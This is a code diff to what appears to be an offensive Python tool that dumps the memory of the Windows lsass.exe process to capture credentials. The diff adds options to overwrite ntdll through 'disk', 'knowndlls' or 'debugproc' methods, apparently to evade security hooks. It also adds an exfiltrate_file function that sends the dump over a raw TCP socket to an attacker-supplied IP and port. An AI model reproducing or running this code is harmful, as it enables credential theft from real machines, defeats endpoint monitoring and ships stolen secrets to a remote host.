@@ -1,5 +1,4 @@
-import os
-import sys
+import os, sys
 import json
 import psutil
 import random
@@ -8,6 +7,10 @@ import ctypes
 from ctypes import wintypes
 import warnings
 warnings.filterwarnings("ignore", category=DeprecationWarning) 
+import argparse
+from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
+import socket
+
 
 # Constants
 PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -255,9 +258,16 @@ def get_modules_info(process_handle):
     return moduleinfo_arr
 
 
-def create_file(output_file, dump_file):
+def create_file(dump_file, output_file):
     with open(output_file, "wb") as binary_file:
         binary_file.write(dump_file)
+
+
+def exfiltrate_file(dump_file, ip_address, port_address):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip_address,int(port_address)))
+    s.sendall(dump_file)
+    s.close()
 
 
 def read_binary_file(file_path):
@@ -366,7 +376,34 @@ def get_os_version():
     return lock_info
     
 
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-o', '--option', required=False, default="", action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
+    parser.add_argument('-k', '--path'  , required=False, default="", action='store', help='Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)')
+    parser.add_argument('-i', '--ip'    , required=False, default="", action='store', help='IP Address for exfiltration')
+    parser.add_argument('-p', '--port'  , required=False, default="", action='store', help='Port for exfiltration')
+    my_args = parser.parse_args()
+    return my_args
+
+
 def main():
+    args = get_args()
+    option = args.option
+    if option == "disk":
+        path = "C:\\Windows\\System32\\ntdll.dll"
+        if args.path != "":
+            path = args.path
+        overwrite_disk(path)
+    elif option == "knowndlls":
+        overwrite_knowndlls()
+    elif option == "debugproc":
+        path = "c:\\windows\\system32\\calc.exe"
+        if args.path != "":
+            path = args.path
+        overwrite_debugproc(path)
+    else:
+        pass
+
     pid_ = get_pid("lsass.exe")
     if pid_:
         print("[+] PID: \t\t" + str(pid_))
@@ -433,10 +470,14 @@ def main():
         mem_address += memory_info.RegionSize
 
     os_version = get_os_version()[0]
-    dump_file = get_dump_bytearr(os_version, moduleinfo_arr, mem64list_arr, regions_memdump)
+    dump_file_bytes = get_dump_bytearr(os_version, moduleinfo_arr, mem64list_arr, regions_memdump)
     dump_file_name = "proc_" + str(pid_) + ".dmp"
-    create_file(dump_file_name, dump_file)
-    print("[+] File " + dump_file_name + " created.")
+    if args.ip == "" or args.port == "":
+        create_file(dump_file_bytes, dump_file_name)
+        print("[+] File " + dump_file_name + " created.")
+    else:
+        exfiltrate_file(dump_file_bytes, args.ip, args.port)
+        print("[+] File exfiltrated.")
 
 
 if __name__ == "__main__":
